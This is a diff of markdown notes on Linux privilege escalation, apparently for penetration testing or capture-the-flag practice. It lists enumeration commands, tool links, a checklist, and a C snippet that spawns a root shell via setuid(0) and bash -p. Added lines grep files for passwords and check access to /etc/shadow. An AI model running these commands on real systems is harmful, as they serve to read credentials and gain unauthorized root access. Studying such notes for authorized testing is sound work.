@@ -7,22 +7,24 @@
     cat /etc/passwd | grep /bin/bash   
     ls -l /etc/shadow   
     sudo -l  
+    ps -aux | grep root 
     
     netstat -antp; arp -a 
     for x in {1 .. 254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " "
 ## Scripts
 run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with increasing run levels, [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), [linenum](https://github.com/rebootuser/LinEnum) 
 ## Checklists
-[Linux Priv Esc Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)  
+[gtfobins](https://gtfobins.github.io/) 
 - [ ] Sudo binaries?? 
 Scripts running as cron jobs you can write to?? 
-SUID binaries?? 
-Services running as root??
-Passwords / config files??
-Is the kernel vulnerable??
+SUID binaries??   
+Services running as root??  
+Passwords / config files??  
+Is the kernel vulnerable?? 
+[Linux Priv Esc Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)  
 # Exploits
 ## Cronjobs    
-look for scripts you can write to or exploit using [gtfobins](https://gtfobins.github.io/) 
+look for scripts you can write to or exploit  
 
     cat /etc/cronjobs   
     crontab -l    
@@ -34,6 +36,12 @@ look for scripts you can write to or exploit using [gtfobins](https://gtfobins.g
         setuid(0);
         system("/bin/bash -p");
     }
+## Services Running as Root 
+    ps -aux | grep root
+    mysql exploit 
+## Passwords / config files 
+    find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \; 
+    /etc/passwd, /etc/shadow  read or write?? 
 ## Kernel Exploits 
     uname -a  
     cat /etc/*-release
